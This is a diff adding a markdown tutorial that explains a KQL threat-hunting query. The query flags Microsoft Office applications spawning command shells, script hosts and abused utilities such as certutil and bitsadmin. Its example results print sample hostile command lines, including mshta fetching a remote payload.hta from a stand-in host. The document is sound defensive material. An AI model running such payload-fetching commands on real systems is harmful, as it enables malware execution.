@@ -1,0 +1,294 @@
+````markdown
+# Day 2 — Office Applications Spawning Suspicious Child Processes
+
+## Objective
+
+Identify Microsoft Office applications launching command interpreters, script hosts or commonly abused Windows utilities.
+
+This behaviour may indicate that a malicious document, macro, embedded object or link has triggered command execution.
+
+The query is intended for **threat hunting** and should not be treated as confirmation of malicious activity.
+
+---
+
+## Scenario
+
+Office applications are commonly used as an initial execution vector.
+
+A suspicious process chain may resemble:
+
+```text
+winword.exe
+    └── powershell.exe
+```
+
+```text
+excel.exe
+    └── cmd.exe
+```
+
+```text
+outlook.exe
+    └── mshta.exe
+```
+
+These relationships can occur legitimately, but they may warrant investigation when observed unexpectedly.
+
+---
+
+## Data Source
+
+This query uses:
+
+- `DeviceProcessEvents`
+
+The table contains process creation telemetry from Microsoft Defender for Endpoint.
+
+---
+
+## MITRE ATT&CK
+
+- **T1204.002 — User Execution: Malicious File**
+- **T1059 — Command and Scripting Interpreter**
+- **T1059.001 — PowerShell**
+- **T1059.003 — Windows Command Shell**
+
+Additional techniques may apply depending on the child process identified.
+
+---
+
+## KQL Concepts
+
+This query introduces or reinforces:
+
+- `let`
+- `dynamic`
+- `ago()`
+- `where`
+- `in~`
+- `extend`
+- `case()`
+- `project`
+- `order by`
+
+---
+
+## KQL Query
+
+```kql
+// Day 2 - Office Applications Spawning Suspicious Child Processes
+// Identifies Office applications launching command interpreters,
+// script hosts and commonly abused Windows utilities.
+
+let Lookback = 7d;
+
+let OfficeApplications = dynamic([
+    "winword.exe",
+    "excel.exe",
+    "powerpnt.exe",
+    "outlook.exe",
+    "onenote.exe",
+    "msaccess.exe",
+    "mspub.exe",
+    "visio.exe"
+]);
+
+let SuspiciousChildProcesses = dynamic([
+    "powershell.exe",
+    "pwsh.exe",
+    "cmd.exe",
+    "mshta.exe",
+    "wscript.exe",
+    "cscript.exe",
+    "rundll32.exe",
+    "regsvr32.exe",
+    "certutil.exe",
+    "bitsadmin.exe"
+]);
+
+DeviceProcessEvents
+| where Timestamp >= ago(Lookback)
+| where InitiatingProcessFileName in~ (OfficeApplications)
+| where FileName in~ (SuspiciousChildProcesses)
+| extend ExecutionCategory = case(
+    FileName in~ ("powershell.exe", "pwsh.exe"),
+        "PowerShell",
+    FileName =~ "cmd.exe",
+        "Windows Command Shell",
+    FileName in~ ("wscript.exe", "cscript.exe", "mshta.exe"),
+        "Script or HTA Execution",
+    FileName in~ ("rundll32.exe", "regsvr32.exe"),
+        "DLL or COM Proxy Execution",
+    FileName in~ ("certutil.exe", "bitsadmin.exe"),
+        "Transfer or Utility Execution",
+    "Other"
+)
+| project
+    Timestamp,
+    DeviceName,
+    AccountName,
+    InitiatingProcessFileName,
+    FileName,
+    ExecutionCategory,
+    ProcessCommandLine,
+    FolderPath,
+    SHA1,
+    ProcessId,
+    ProcessUniqueId,
+    InitiatingProcessId,
+    InitiatingProcessUniqueId,
+    DeviceId,
+    ReportId
+| order by Timestamp desc
+```
+
+---
+
+## How the Query Works
+
+### Define the Lookback Period
+
+```kql
+let Lookback = 7d;
+```
+
+This controls how far back the query searches.
+
+---
+
+### Define the Office Applications
+
+```kql
+let OfficeApplications = dynamic([...]);
+```
+
+A `dynamic` array is used to store the Office applications that will be treated as the parent process.
+
+---
+
+### Define the Suspicious Child Processes
+
+```kql
+let SuspiciousChildProcesses = dynamic([...]);
+```
+
+This list contains command interpreters, script hosts and legitimate Windows utilities that are commonly abused by attackers.
+
+The processes themselves are not inherently malicious.
+
+---
+
+### Filter the Process Events
+
+```kql
+| where InitiatingProcessFileName in~ (OfficeApplications)
+| where FileName in~ (SuspiciousChildProcesses)
+```
+
+These filters identify events where an Office application directly launched one of the listed processes.
+
+The `in~` operator performs a case-insensitive comparison.
+
+---
+
+### Categorise the Activity
+
+```kql
+| extend ExecutionCategory = case(...)
+```
+
+The `case()` function assigns each result a readable category based on the child process.
+
+This makes it easier to review and group the results.
+
+---
+
+### Select the Output
+
+```kql
+| project ...
+```
+
+The query returns the most useful investigation fields, including:
+
+- Device
+- User
+- Parent process
+- Child process
+- Command line
+- File path
+- File hash
+- Process identifiers
+
+---
+
+## Expected Results
+
+The query may return activity such as:
+
+```text
+winword.exe
+    └── powershell.exe -EncodedCommand ...
+```
+
+```text
+excel.exe
+    └── cmd.exe /c script.bat
+```
+
+```text
+outlook.exe
+    └── mshta.exe https://example.test/payload.hta
+```
+
+Results should be reviewed alongside the command line, user activity and surrounding endpoint telemetry.
+
+---
+
+## Potential False Positives
+
+Legitimate results may include:
+
+- Approved macros
+- Office add-ins
+- Business automation
+- Administrative scripts
+- Document-management tools
+- Helpdesk troubleshooting
+- Security testing
+
+Known legitimate command lines or business processes can be excluded after they have been reviewed.
+
+---
+
+## Limitations
+
+This query only identifies direct parent-child relationships.
+
+It may not identify longer process chains such as:
+
+```text
+winword.exe
+    └── loader.exe
+            └── powershell.exe
+```
+
+It also does not confirm that the Office document was malicious or that the command completed successfully.
+
+---
+
+## References
+
+- [Microsoft Defender XDR — DeviceProcessEvents](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table)
+- [Microsoft Learn — case()](https://learn.microsoft.com/en-us/kusto/query/case-function)
+- [MITRE ATT&CK — T1204.002: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
+- [MITRE ATT&CK — T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+
+---
+
+## Disclaimer
+
+This query is intended for threat hunting, research and educational use.
+
+It should be tested and tuned against the target environment before being used as a production detection.
+````
